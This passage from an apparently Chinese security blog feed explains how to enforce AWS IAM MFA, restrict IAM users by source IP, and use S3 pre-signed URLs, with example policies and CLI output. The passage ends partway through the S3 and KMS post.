    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>众所周知，AWS在账号体系这块支持使用MFA，而我们在使用MFA的时候通常有如下几种场景：</p><ol><li>用或者不用MFA都行</li><li>通过Policy强制User使用MFA（console、CLI），不用的话就不让你访问</li><li>通过Policy强制User在控制台使用MFA，在CLI上不使用MFA（安全向业务需求的妥协）</li><li>MFA相关Policy Key的解读</li><li>Yubikey、硬件MFA设备初体验</li></ol><p>所以说嘛，安全这个事是相对的，回到安全哲学上，这件事取决于要保护的业务资产的重要程度和价值。下面就上述几种情况的使用场景及配置方法，做一下逐一说明。（需要留意的是目前在AWS中国区只支持虚拟MFA设备，不支持硬件MFA设备或者Yubikey。）</p><h2 id="0x01-配置IAM-User支持MFA（用或者不用MFA都不影响User能否使用AWS资源）"><a href="#0x01-配置IAM-User支持MFA（用或者不用MFA都不影响User能否使用AWS资源）" class="headerlink" title="0x01 配置IAM User支持MFA（用或者不用MFA都不影响User能否使用AWS资源）"></a>0x01 配置IAM User支持MFA（用或者不用MFA都不影响User能否使用AWS资源）</h2><p>我有一个附加了管理员权限的IAM User，但是没有附加任何MFA相关的Policy。这种情况下就属于用不用MFA都行的场景，通常适用于安全意识比较高，可以自觉配置的MFA的同学，比如说企业的安全工程师。或者作为测试账号用用。<br>下面我们就来看看MFA功能如何配置：</p><ol><li>搞个虚拟MFA APP（AWS中国区目前只支持虚拟MFA设备，不支持硬件MFA、Yubikey）</li><li>去IAM控制台配置</li></ol><p><img src="3D66C465786E4FAE9135A6B7826806F4" alt="image"></p><p><img src="EA93F91C93334C639D5ED4456143F8DC" alt="image"></p><p>配置完成后，当我们在控制台登录该IAM User时，是需要输入PIN code的（CLI不需要）。</p><p><img src="35F70F1DED114FDA9F3A73B40C7C6730" alt="image"></p><p><img src="947CD5A416864CDBB1880738CEC393FC" alt="image"></p><p>登录之后，就可以访问里头的服务和资源了。CLI可以直接使用，而无需使用MFA：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 ls --profile mfa_tonghua --region cn-north-1</span><br></pre></td></tr></table></figure></p><p><img src="17B71694C22E487988915CEFBCA86B67" alt="image"></p><h2 id="0x02-通过Policy强制User使用MFA（console、CLI），不用的话就不让你访问"><a href="#0x02-通过Policy强制User使用MFA（console、CLI），不用的话就不让你访问" class="headerlink" title="0x02 通过Policy强制User使用MFA（console、CLI），不用的话就不让你访问"></a>0x02 通过Policy强制User使用MFA（console、CLI），不用的话就不让你访问</h2><p>可以看到上述配置有一个小问题，就是我没有MFA的Policy，当这个User取消MFA之后仍然可以正常登录AWS控制台。那作为一家安全意识比较高的企业或者团队，要求强制使用MFA，如果不使用的话，就不让你继续访问AWS的服务，这里我就说说这个Policy该怎么实现 [2]。按照文档中的Policy，几乎不用做任何修改，附加至User上看看（arn:aws:iam::需要替换成符合中国区规范的arn地址 arn:aws-cn:iam::）。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;Version&quot;: &quot;2012-10-17&quot;,</span><br><span class="line">    &quot;Statement&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;Sid&quot;: &quot;AllowViewAccountInfo&quot;,</span><br><span class="line">            &quot;Effect&quot;: &quot;Allow&quot;,</span><br><span class="line">            &quot;Action&quot;: &quot;iam:ListVirtualMFADevices&quot;,</span><br><span class="line">            &quot;Resource&quot;: &quot;*&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;Sid&quot;: &quot;AllowManageOwnVirtualMFADevice&quot;,</span><br><span class="line">            &quot;Effect&quot;: &quot;Allow&quot;,</span><br><span class="line">            &quot;Action&quot;: [</span><br><span class="line">                &quot;iam:CreateVirtualMFADevice&quot;,</span><br><span class="line">                &quot;iam:DeleteVirtualMFADevice&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;Resource&quot;: &quot;arn:aws-cn:iam::*:mfa/$&#123;aws:username&#125;&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;Sid&quot;: &quot;AllowManageOwnUserMFA&quot;,</span><br><span class="line">            &quot;Effect&quot;: &quot;Allow&quot;,</span><br><span class="line">            &quot;Action&quot;: [</span><br><span class="line">                &quot;iam:DeactivateMFADevice&quot;,</span><br><span class="line">                &quot;iam:EnableMFADevice&quot;,</span><br><span class="line">                &quot;iam:GetUser&quot;,</span><br><span class="line">                &quot;iam:ListMFADevices&quot;,</span><br><span class="line">                &quot;iam:ResyncMFADevice&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;Resource&quot;: &quot;arn:aws-cn:iam::*:user/$&#123;aws:username&#125;&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;Sid&quot;: &quot;DenyAllExceptListedIfNoMFA&quot;,</span><br><span class="line">            &quot;Effect&quot;: &quot;Deny&quot;,</span><br><span class="line">            &quot;NotAction&quot;: [</span><br><span class="line">                &quot;iam:CreateVirtualMFADevice&quot;,</span><br><span class="line">                &quot;iam:EnableMFADevice&quot;,</span><br><span class="line">                &quot;iam:GetUser&quot;,</span><br><span class="line">                &quot;iam:ListMFADevices&quot;,</span><br><span class="line">                &quot;iam:ListVirtualMFADevices&quot;,</span><br><span class="line">                &quot;iam:ResyncMFADevice&quot;,</span><br><span class="line">                &quot;sts:GetSessionToken&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;Resource&quot;: &quot;*&quot;,</span><br><span class="line">            &quot;Condition&quot;: &#123;</span><br><span class="line">                &quot;BoolIfExists&quot;: &#123;&quot;aws:MultiFactorAuthPresent&quot;: &quot;false&quot;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>策略配置成功之后，当我们在CLI中访问可以看到已经报访问拒绝（Access Denied）的错误了。</p><p><img src="5E534B87C80C4CFDBFEF896BEF3EC107" alt="image"></p><p>然后，当我把MFA设备取消激活之后，发现在控制台登录也会被禁止访问了（准确的说，是可以登录成功，但是无法访问任何资源，只有激活MFA之后才能继续使用）。</p><p><img src="26CCA68D594D4913AAD11A0F6C4CAF0E" alt="image"></p><p><img src="446075F33753457D9822CB2BCE2BBBB7" alt="image"></p><p>恩，构造好类似这样的URL：<a href="https://console.amazonaws.cn/iam/home?region=cn-north-1#/users/mfa_tonghua?section=security_credentials" target="_blank" rel="noopener">https://console.amazonaws.cn/iam/home?region=cn-north-1#/users/mfa_tonghua?section=security_credentials</a>当前用户可以给自己创建虚拟MFA设备啦。<br>那你可能就要说了，我控制台上能输入PIN Code访问了，那我CLI咋整啊，有啥参数可以指定吗。emm，莫得慌张CLI可以这么玩[3]（思路就是输入PIN Code创建临时访问凭证，然后使用临时的访问凭证去访问AWS资源）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sts get-session-token --serial-number arn:aws-cn:iam::123456789012:mfa/mfa_tonghua --token-code 631424 --profile mfa_tonghua --region cn-north-1</span><br></pre></td></tr></table></figure></p><p><img src="01961727B5AB4F0BAE524FDA892BBC9C" alt="image"></p><p>–token-code 参数就是虚拟MFA设备上头的动态PIN Code。<br>然后配置临时的访问凭证访问即可：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export AWS_ACCESS_KEY_ID=333</span><br><span class="line">export AWS_SECRET_ACCESS_KEY=222</span><br><span class="line">export AWS_SESSION_TOKEN=111</span><br></pre></td></tr></table></figure></p><p>可以看到已经可以使用临时访问凭证，访问AWS的资源了：</p><p><img src="C253E76D22594AB898FC5779A4443EC7" alt="image"></p><p>如果您通过–debug查看的话可以看到，使用的凭证就是在环境变量env中加载出来的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2019-11-25 06:10:51,777 - MainThread - botocore.credentials - DEBUG - Looking for credentials via: env</span><br><span class="line">2019-11-25 06:10:51,778 - MainThread - botocore.credentials - INFO - Found credentials in environment variables.</span><br></pre></td></tr></table></figure></p><p>如果您不想使用环境变量中的临时凭证了，使用unset命令，删掉指定的环境变量即可。</p><h2 id="0x03-通过Policy强制User在控制台使用MFA，在CLI上不使用MFA（安全向业务需求的妥协）"><a href="#0x03-通过Policy强制User在控制台使用MFA，在CLI上不使用MFA（安全向业务需求的妥协）" class="headerlink" title="0x03 通过Policy强制User在控制台使用MFA，在CLI上不使用MFA（安全向业务需求的妥协）"></a>0x03 通过Policy强制User在控制台使用MFA，在CLI上不使用MFA（安全向业务需求的妥协）</h2><p>上面那种CLI/Console中都强制使用MFA是最稳的一种方式。有的时候，业务部门的同事jio着CLI上还要输入MFA的PIN Code然后拿临时访问凭证好麻烦啊，能不能CLI上不走MFA额，这件事情是可以做到的，但是在做之前要明确几件事情：</p><ol><li>现有的CLI通过输入PIN Code生成临时访问凭证的方式为什么不能满足需求？</li><li>有没有尝试使用EC2 Role的方式？能不能满足需求？</li><li>不走MFA，CLI凭证泄露的风险由业务部门自行承担<br>几个问题都问完之后，就可以接着往下操作了，其实很简单，只要修改Policy中的如下部分即可：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;Effect&quot; : &quot;Deny&quot;,</span><br><span class="line">&quot;Condition&quot; : &#123; &quot;Bool&quot; : &#123; &quot;aws:MultiFactorAuthPresent&quot; : false &#125; &#125;</span><br></pre></td></tr></table></figure></li></ol><p>唯一的区别就是将BoolIfExists修改为Bool，先测试一下看看效果，稍后会对这些Key做详细的解读。<br>可以看到CLI上已经无需使用MFA了，而控制台仍然需要：</p><p><img src="D530FCB6AE2C423A9FE935980D84CFEB" alt="image"></p><p><img src="0D3022349B0E454FA8488EBB615F97B0" alt="image"></p><p>搞定！</p><h2 id="0x04-MFA相关Policy-Key的解读"><a href="#0x04-MFA相关Policy-Key的解读" class="headerlink" title="0x04 MFA相关Policy Key的解读"></a>0x04 MFA相关Policy Key的解读</h2><p>在这一小节，我就着重说一说Policy中跟MFA息息相关的Policy Key，一共如下几个：</p><ol><li>aws:MultiFactorAuthPresent</li><li>BoolIfExists</li><li>Bool<br>aws:MultiFactorAuthPresent是Policy中的全局Condition Key[4]，当用户使用临时访问凭证发起请求时，在其请求的上下文中会包含该Key，使用持久化的访问凭证发起请求时，在其请求上下文中是不包含该Key的。<br>那什么是临时访问凭证发起的请求呢？典型有控制台、Role、或者get-session-token生成的凭证都是临时访问凭证。<br>那CLI/控制台都是用MFA的Policy怎么解读呢：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;Effect&quot; : &quot;Deny&quot;,</span><br><span class="line">&quot;Condition&quot; : &#123; &quot;BoolIfExists&quot; : &#123; &quot;aws:MultiFactorAuthPresent&quot; : false &#125; &#125;</span><br></pre></td></tr></table></figure></li></ol><p>临时访问凭证中包含aws:MultiFactorAuthPresent这个Key，<br>在请求上下文中，如果包含aws:MultiFactorAuthPresent这个Key，并且这个Key等于true代表用了MFA，等于false代表没走MFA。<br>那回到这个Policy，当我使用了MFA时，aws:MultiFactorAuthPresent==true，然后这个Condition不成立，就不会执行该Policy，然后就会allow继续操作，如果我没使用MFA，aws:MultiFactorAuthPresent==false，条件成立，Policy生效，会Deny掉相关的API call。当我使用持久凭证时，没有aws:MultiFactorAuthPresent这个Key，所以默认Condition成立，进而Policy成立，会Deny掉相关API call。<br>在控制台中使用MFA，CLI中不使用MFA的Policy解读：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;Effect&quot; : &quot;Deny&quot;,</span><br><span class="line">&quot;Condition&quot; : &#123; &quot;Bool&quot; : &#123; &quot;aws:MultiFactorAuthPresent&quot; : false &#125; &#125;</span><br></pre></td></tr></table></figure></p><p>在请求上下文中，aws:MultiFactorAuthPresent == true（使用MFA）时，Condition不成立，Policy不生效，可以执行相关API call，等于false时，Condition成立，Policy生效，会被Deny掉相关API call。</p><h2 id="0x05-Yubikey、硬件MFA设备初体验"><a href="#0x05-Yubikey、硬件MFA设备初体验" class="headerlink" title="0x05 Yubikey、硬件MFA设备初体验"></a>0x05 Yubikey、硬件MFA设备初体验</h2><p>注意了，以下的配置目前并不适用于AWS中国区，但是为了保证文章的完整性，我在AWS Global区域做了测试。<br>先来看看YubiKey：</p><p><img src="C50C284BCEBA43139F04D4E04D62E3FD" alt="image"></p><p><img src="864AB0BA795A4F7CAAED771212D9A661" alt="image"></p><p><img src="D7227C6E1F3945C48B17034ACA65575A" alt="image"></p><p>再登录的时候就变成这样了：</p><p><img src="2942EB24F2E645539942FAD9C4F36542" alt="image"></p><p>当然，遇到问题了也别慌，参考下这个[5]，看能不能解决您的问题。<br>硬件MFA设备先不看了，我的设备是8位的，它的好像只能6位？</p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>记录一下AWS使用MFA的常见场景，备忘。</p><h2 id="0x07-参考链接"><a href="#0x07-参考链接" class="headerlink" title="0x07 参考链接"></a>0x07 参考链接</h2><p>[1] Multi-factor Authentication, <a href="https://aws.amazon.com/cn/iam/features/mfa/" target="_blank" rel="noopener">https://aws.amazon.com/cn/iam/features/mfa/</a><br>[2] AWS: Allows MFA-Authenticated IAM Users to Manage Their Own MFA Device on the My Security Credentials Page, <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_examples_aws_my-sec-creds-self-manage-mfa-only.html" target="_blank" rel="noopener">https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_examples_aws_my-sec-creds-self-manage-mfa-only.html</a><br>[3] How do I use an MFA token to authenticate access to my AWS resources through the AWS CLI?, <a href="https://aws.amazon.com/premiumsupport/knowledge-center/authenticate-mfa-cli/?nc1=h_ls" target="_blank" rel="noopener">https://aws.amazon.com/premiumsupport/knowledge-center/authenticate-mfa-cli/?nc1=h_ls</a><br>[4] AWS Global Condition Context Keys, <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_condition-keys.html" target="_blank" rel="noopener">https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_condition-keys.html</a><br>[5] Troubleshooting U2F Security Keys, <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/troubleshoot_mfa-u2f.html" target="_blank" rel="noopener">https://docs.aws.amazon.com/IAM/latest/UserGuide/troubleshoot_mfa-u2f.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;众所周知，AWS在账号体系这块支持使用MFA，而我们在使用MFA的时候通常有如下几种场景：&lt;/p&gt;

      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>如何限制IAM User只能在指定的IP登录？</title>
    <link href="https://tonghuaroot.com/2019/11/23/Specify-IP-Use-AWS/"/>
    <id>https://tonghuaroot.com/2019/11/23/Specify-IP-Use-AWS/</id>
    <published>2019-11-23T07:52:47.000Z</published>
    <updated>2019-11-23T15:56:00.653Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>无论是创建IAM User的时候，还是在配置Policy的时候，都可以看到Policy中的Condition中是有一个aws:SourceIp属性的。</p><h2 id="0x01-如何写这个Polciy"><a href="#0x01-如何写这个Polciy" class="headerlink" title="0x01 如何写这个Polciy"></a>0x01 如何写这个Polciy</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;Version&quot;: &quot;2012-10-17&quot;,</span><br><span class="line">    &quot;Statement&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;Sid&quot;: &quot;VisualEditor0&quot;,</span><br><span class="line">            &quot;Effect&quot;: &quot;Allow&quot;,</span><br><span class="line">            &quot;Action&quot;: &quot;*&quot;,</span><br><span class="line">            &quot;Resource&quot;: &quot;*&quot;,</span><br><span class="line">            &quot;Condition&quot;: &#123;</span><br><span class="line">                &quot;IpAddress&quot;: &#123;</span><br><span class="line">                    &quot;aws:SourceIp&quot;: &quot;54.222.xxx.xxx/32&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>aws:SourceIp键对应的值修改为办公网出口IP即可（保险起见要确定出口IP是固定不变的，而不是采用的动态IP）。</p><p>那你可能就要说了，如果我有多个IP段那该咋整呢？简单，可以跟着这个Policy改改就行了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;Version&quot;: &quot;2012-10-17&quot;,</span><br><span class="line">    &quot;Statement&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;Sid&quot;: &quot;VisualEditor0&quot;,</span><br><span class="line">            &quot;Effect&quot;: &quot;Allow&quot;,</span><br><span class="line">            &quot;Action&quot;: &quot;*&quot;,</span><br><span class="line">            &quot;Resource&quot;: &quot;*&quot;,</span><br><span class="line">            &quot;Condition&quot;: &#123;</span><br><span class="line">                &quot;ForAnyValue:IpAddress&quot;: &#123;</span><br><span class="line">                    &quot;aws:SourceIp&quot;: [</span><br><span class="line">                        &quot;54.222.xxx.xxx/32&quot;,</span><br><span class="line">                        &quot;192.168.1.1&quot;</span><br><span class="line">                    ]</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>上述Policy可同时限制CLI和console。</p><h2 id="0x02-Policy-参数解读"><a href="#0x02-Policy-参数解读" class="headerlink" title="0x02 Policy 参数解读"></a>0x02 Policy 参数解读</h2><p>在上面的示例Policy中，有几个参数还是比较有价值的，一一解读一下ForAnyValue、IpAddress、aws:SourceIp：</p><ol><li>ForAnyValue，只要有一个值在符合要求，那就是符合要求</li><li>IpAddress，IP地址，支持普通的地址格式、CIDR格式</li><li>aws:SourceIp，请求的客户端IP</li></ol><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>额，这种直接测一下就行了，生产环境上头还是先测测，确认可行再上生产。</p><h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><p>[1] Creating a Condition with Multiple Keys or Values, <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_multi-value-conditions.html" target="_blank" rel="noopener">https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_multi-value-conditions.html</a><br>[2] Request, <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/intro-structure.html#intro-structure-request" target="_blank" rel="noopener">https://docs.aws.amazon.com/IAM/latest/UserGuide/intro-structure.html#intro-structure-request</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;无论是创建IAM User的时候，还是在配置Policy的时候，都可以看到Policy中的Condi
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>S3 pre-signed URL 与 KMS 加密那些事</title>
    <link href="https://tonghuaroot.com/2019/11/23/S3-pre-signed-url-and-KMS/"/>
    <id>https://tonghuaroot.com/2019/11/23/S3-pre-signed-url-and-KMS/</id>
    <published>2019-11-23T06:53:55.000Z</published>
    <updated>2019-11-23T15:05:22.208Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在这篇文章中，我会记录一下关于S3 pre-signed url和KMS加密交互的一些玩法。比如说：</p><ol><li>简单介绍一下什么是S3 pre-signed URL</li><li>经过KMS加密之后还能直接公开访问object吗？</li><li>经过KMS加密之后还能通过pre-signed URL的方式将object公开访问吗？</li><li>访问S3 pre-signed URL报认证错误应该怎么处理？</li></ol><h2 id="0x01-S3-pre-signed-URL-概述"><a href="#0x01-S3-pre-signed-URL-概述" class="headerlink" title="0x01 S3 pre-signed URL 概述"></a>0x01 S3 pre-signed URL 概述</h2><p>简单理解，就是我们想将一个S3桶中的对象临时公开，可以通过presign命令生成一个临时有效期的链接，而用户可以通过这个临时的URL下载并访问对象。<br>话不多说了，先来个命令看看咋回事，正常情况下我们使用有权限的AKSK访问指定对象时会通过如下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 ~]# aws s3 cp s3://aaabbbccc/webwxgeticon.jpg webwxgetion.jpg --profile root</span><br><span class="line">download: s3://aaabbbccc/webwxgeticon.jpg to ./webwxgetion.jpg</span><br></pre></td></tr></table></figure></p><p>如果我们没有登录去下载的话，通常会报一个访问禁止的403错误，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 ~]# aws s3 cp s3://aaabbbccc/webwxgeticon.jpg webwxgetion.jpg --no-sign-request</span><br><span class="line">fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden</span><br></pre></td></tr></table></figure></p><p>使用浏览器或者wget直接下载的话，会报如下错误：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 ~]# wget https://aaabbbccc.s3.cn-north-1.amazonaws.com.cn/webwxgeticon.jpg</span><br><span class="line">--2019-11-23 13:33:05--  https://aaabbbccc.s3.cn-north-1.amazonaws.com.cn/webwxgeticon.jpg</span><br><span class="line">Resolving aaabbbccc.s3.cn-north-1.amazonaws.com.cn (aaabbbccc.s3.cn-north-1.amazonaws.com.cn)... 54.222.49.142</span><br><span class="line">Connecting to aaabbbccc.s3.cn-north-1.amazonaws.com.cn (aaabbbccc.s3.cn-north-1.amazonaws.com.cn)|54.222.49.142|:443... connected.</span><br><span class="line">HTTP request sent, awaiting response... 403 Forbidden</span><br><span class="line">2019-11-23 13:33:05 ERROR 403: Forbidden.</span><br><span class="line"></span><br><span class="line">[root@ip-10-0-0-64 ~]# curl https://aaabbbccc.s3.cn-north-1.amazonaws.com.cn/webwxgeticon.jpg</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;Error&gt;&lt;Code&gt;AccessDenied&lt;/Code&gt;&lt;Message&gt;Access Denied&lt;/Message&gt;&lt;RequestId&gt;39231AA211436AF7&lt;/RequestId&gt;&lt;HostId&gt;a7athzq0DU1D11oBpMF9ZeNziPz9sjw1ZLY0Ga+xUmpMN1ZkhnITDci7zisSfDa+nyTcw/sbSkk=&lt;/HostId&gt;&lt;/Error&gt;[root@ip-10-0-0-64 ~]#</span><br></pre></td></tr></table></figure></p><p><img src="C271ADB4280441099A8820744E327476" alt="image"></p><p>当然，上述做法是因为我没有把对象开放公开访问的权限，所以报错是正常的。这个时候我有一个使用场景，就是我想把一个对象临时的开放给某一个用户，而这通常有两种做法，一种是直接公开，另一种是使用这里提到的pre-signed URL的方法，第一种直接公开的方法是并不可取的，因为如果有人能爆破出来这个URL的话，那他就可以直接下载这个对象了，而且在对象有效期管理上，也是一个比较复杂的事，那我们直接上pre-signed URL看看：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 ~]# aws s3 presign s3://aaabbbccc/webwxgeticon.jpg --profile root</span><br><span class="line">https://aaabbbccc.s3.cn-north-1.amazonaws.com.cn/webwxgeticon.jpg?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Expires=3600&amp;X-Amz-Credential=AKIAXUIR4JOPO4YK27P7%2F20191123%2Fcn-north-1%2Fs3%2Faws4_request&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Date=20191123T133719Z&amp;X-Amz-Signature=1bdedc3e99edc60fd266f10ec4368166112d9b311610f02910304ae6eda28503</span><br><span class="line">[root@ip-10-0-0-64 ~]#</span><br></pre></td></tr></table></figure></p><p>然后拿着这个pre-signed URL就可以访问对象了：</p><p><img src="20D5E656FCA04A1080FEEF186C561CFF" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 ~]# aws s3api head-object --bucket aaabbbccc --key webwxgeticon.jpg --profile root</span><br><span class="line">&#123;</span><br><span class="line">    &quot;AcceptRanges&quot;: &quot;bytes&quot;,</span><br><span class="line">    &quot;ContentType&quot;: &quot;image/jpeg&quot;,</span><br><span class="line">    &quot;LastModified&quot;: &quot;Sat, 23 Nov 2019 13:31:01 GMT&quot;,</span><br><span class="line">    &quot;ContentLength&quot;: 13048,</span><br><span class="line">    &quot;ETag&quot;: &quot;\&quot;bade48249f0809beca0226e7ec4ef50f\&quot;&quot;,</span><br><span class="line">    &quot;Metadata&quot;: &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">[root@ip-10-0-0-64 ~]# curl &quot;https://aaabbbccc.s3.cn-north-1.amazonaws.com.cn/webwxgeticon.jpg?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Expires=3600&amp;X-Amz-Credential=AKIAXUIR4JOPO4YK27P7%2F20191123%2Fcn-north-1%2Fs3%2Faws4_request&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Date=20191123T133719Z&amp;X-Amz-Signature=1bdedc3e99edc60fd266f10ec4368166112d9b311610f02910304ae6eda28503&quot; --output 1.jpg</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100 13048  100 13048    0     0   326k      0 --:--:-- --:--:-- --:--:--  326k</span><br><span class="line">[root@ip-10-0-0-64 ~]# md5sum 1.jpg</span><br><span class="line">bade48249f0809beca0226e7ec4ef50f  1.jpg</span><br><span class="line">[root@ip-10-0-0-64 ~]#</span><br></pre></td></tr></table></figure><p><img src="90381681BAE849C691F443B27228E3DE" alt="image"></p><p>上面就是一个S3 pre-signed URL的正常使用流程，接下来看看各种奇葩场景。</p><h2 id="0x02-经过KMS加密之后还能直接公开访问object吗？"><a href="#0x02-经过KMS加密之后还能直接公开访问object吗？" class="headerlink" title="0x02 